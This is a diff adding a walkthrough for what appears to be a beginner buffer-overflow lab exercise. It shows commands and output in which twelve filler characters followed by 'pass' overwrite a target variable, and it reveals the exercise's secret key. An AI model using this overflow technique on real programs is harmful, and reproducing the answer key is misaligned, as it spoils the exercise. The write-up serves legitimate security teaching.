@@ -1,0 +1,39 @@
+
+## Problem One, Part A ##
+### Walk Through ###
+We start by trying to execute the program and we are greeted with output.
+ 
+ user@host$ ./oflow_partA
+  ./binary <string>
+  This program takes one argument.
+
+This looks like a usage message and says the program only takes a single argument. Lets try a single command line argument. 
+  
+  user@host$ ./oflow_partA AAAA
+
+  Buffer: AAAA
+  Target: fail
+
+  Target not set to "pass".
+
+More output! We see that our input is printed with the label Buffer and below it is a Target with the value fail. There is another message saying that Target wasn't set to "pass". Using meta-knowledge we know this is an exercise about buffer overflows so lets try to provide a lot of input! 
+
+  user@host$ ./oflow_partA AAAAAAAAAAAAAAAAAAAA
+
+  Buffer: AAAAAAAAAAAAA
+  Target: AAAA
+
+  Target not set to "pass".
+
+Progress. It looks like our input was also copied into where ever Target is getting its value from! Looks like we overflowed the buffer. We can see that there are only twelve 'A's for the Buffer value and four for the Target value. Using this info we can try to use twelve 'A's then "pass" to try and please the program. 
+  
+  user@host$ ./oflow_partA AAAAAAAAAAAApass
+
+  Buffer: AAAAAAAAAAAAA
+  Target: pass
+
+  Congrats! You overwrote the target!
+  The key is: "smash the stack"
+
+Success. We got a secret key from the program. 
+
